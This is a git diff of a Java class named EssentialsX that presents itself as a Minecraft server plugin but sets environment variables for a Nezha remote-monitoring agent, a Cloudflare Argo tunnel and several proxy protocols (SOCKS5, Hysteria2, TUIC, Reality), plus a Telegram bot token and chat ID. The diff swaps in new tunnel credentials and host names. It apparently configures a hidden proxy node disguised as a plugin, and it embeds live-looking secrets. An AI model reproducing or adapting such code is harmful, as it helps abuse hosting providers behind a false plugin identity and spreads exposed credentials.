@@ -79,20 +79,20 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         env.put("ARGO_PORT", "9123");
-        env.put("ARGO_DOMAIN", "minestrator.omi.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiZTAwMTdkMjEtYjFiMS00OTlmLWI5NGQtNTFmNzUzMTg0ZDc4IiwicyI6Ik5URXdaakl3WldNdE1HUmtZaTAwT1RNMUxUZ3dNRE10WWpnNE1EWTNaakU1WlRBNSJ9");
-        env.put("S5_PORT", "21488");
-        env.put("HY2_PORT", "21488");
-        env.put("TUIC_PORT", "25575");
+        env.put("ARGO_DOMAIN", "krf3.omi.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiNmRjOWJhYmYtZGQwYi00ZDUxLTk5NTUtODU4MTlkZGVhOTRhIiwicyI6InArQ1lHS21ZVzg5c3cyQzN1UmtBQWNlK1NvQmdISGdWVHJFNFBQVU9pNWM9In0=");
+        env.put("S5_PORT", "");
+        env.put("HY2_PORT", "25841");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "25575");
+        env.put("REALITY_PORT", "25841");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5958841738");
         env.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Minestrator");
+        env.put("NAME", "Weirdhost-krf3");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
